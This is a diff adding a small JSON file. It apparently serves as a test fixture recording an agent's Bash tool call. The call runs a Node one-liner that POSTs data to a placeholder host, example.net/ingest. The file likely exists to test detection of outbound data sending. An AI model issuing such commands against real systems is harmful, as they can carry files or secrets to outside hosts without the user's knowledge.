@@ -1,0 +1,6 @@
+{
+  "tool_name": "Bash",
+  "tool_input": {
+    "command": "node -e \"require('node-fetch')('https://example.net/ingest',{method:'POST',body:'x'})\""
+  }
+}
